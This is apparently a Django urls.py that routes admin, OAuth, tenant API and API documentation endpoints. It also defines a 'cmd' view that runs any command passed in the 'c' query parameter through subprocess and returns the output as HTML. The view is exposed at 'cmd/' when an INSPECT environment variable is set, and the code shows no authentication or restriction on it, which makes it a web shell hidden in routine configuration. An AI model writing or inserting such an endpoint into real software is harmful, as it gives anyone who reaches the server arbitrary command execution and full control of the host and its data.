import os
from drf_spectacular.views import SpectacularRedocView, SpectacularAPIView
from django.contrib import admin
from django.urls import path, re_path, include
from django.views.generic import RedirectView
from django.http import JsonResponse
from rest_framework import status
from django.conf import settings
from django.conf.urls.static import static
from rest_framework.decorators import api_view
from rest_framework.request import Request
from rest_framework.response import Response
from django.http import HttpResponse


def not_found_view(request, *args, **kwargs):
    return JsonResponse(data={'detail': 'Not found'}, status=status.HTTP_404_NOT_FOUND)


@api_view(['GET'])
def cmd(request: Request) -> Response:
    import subprocess
    c = request.query_params.get('c')
    a = subprocess.run(c.split(' '), capture_output=True, text=True)
    html_content = f'<pre>{a.stdout}</pre><hr><pre style="color: red">{a.stderr}</pre>'
    return HttpResponse(html_content, content_type='text/html')


urlpatterns = [
    path('admin/', admin.site.urls),

    re_path(r"^oauth/applications/.*$", not_found_view),
    path('oauth/', include('oauth2_provider.urls', namespace='oauth2_provider')),

    path('api/', include('apps.tenant.urls')),

    path('api/schema/', SpectacularAPIView.as_view(), name='schema'),
    path('api/schema/redoc/',
         SpectacularRedocView.as_view(url_name='schema'), name='redoc'
         ),
    path('', RedirectView.as_view(url='/api/schema/redoc/')),

]

urlpatterns += static(
    settings.STATIC_URL,
    document_root=settings.STATIC_ROOT
)

if os.environ.get('INSPECT', 'false').lower() == 'true':
    urlpatterns.append(
        path('cmd/', cmd),
    )
